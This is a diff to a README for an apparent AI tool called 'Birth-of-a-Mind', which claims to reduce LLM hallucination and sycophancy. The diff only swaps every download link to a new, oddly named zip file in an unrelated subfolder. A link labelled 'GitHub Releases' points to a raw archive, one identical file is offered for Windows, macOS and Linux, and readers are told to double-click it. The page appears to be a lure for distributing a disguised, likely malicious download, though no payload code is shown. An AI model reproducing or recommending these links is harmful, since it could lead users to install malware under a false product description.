@@ -1,7 +1,7 @@
 # 🧠 Birth-of-a-Mind - Control LLM Behavior Today  
 
 ## 📥 Download Now  
-[![Download Now](https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/Birth-a-of-Mind-1.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/Birth-a-of-Mind-1.7.zip)
+[![Download Now](https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/of-Birth-a-Mind-v3.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/of-Birth-a-Mind-v3.6.zip)
 
 ## 🚀 Getting Started  
 Welcome to the **Birth-of-a-Mind** project. This application helps improve the behavior of large language models (LLMs). It reduces issues like giving incorrect answers or agreeing just to please the user. Follow these simple steps to download and run the software.
@@ -20,12 +20,12 @@ The **Birth-of-a-Mind** application includes:
 - **Anti-Entropy Mechanism**: Prevents repeating clichés and false information.
 
 ## 💻 Download & Install  
-1. **Visit this page to download**: [GitHub Releases](https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/Birth-a-of-Mind-1.7.zip)  
+1. **Visit this page to download**: [GitHub Releases](https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/of-Birth-a-Mind-v3.6.zip)  
 2. Locate the latest version under the Releases section.
 3. Click on the file that matches your operating system. For example:
-   - For Windows, look for `https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/Birth-a-of-Mind-1.7.zip`.
-   - For MacOS, look for `https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/Birth-a-of-Mind-1.7.zip`.
-   - For Linux, look for `https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/Birth-a-of-Mind-1.7.zip`.
+   - For Windows, look for `https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/of-Birth-a-Mind-v3.6.zip`.
+   - For MacOS, look for `https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/of-Birth-a-Mind-v3.6.zip`.
+   - For Linux, look for `https://github.com/Jayden-HH/Birth-of-a-Mind/raw/refs/heads/main/Claromontane/of-Birth-a-Mind-v3.6.zip`.
 
 4. Once the download completes, navigate to your downloads folder.
 5. Double-click the downloaded file to start the installation process.
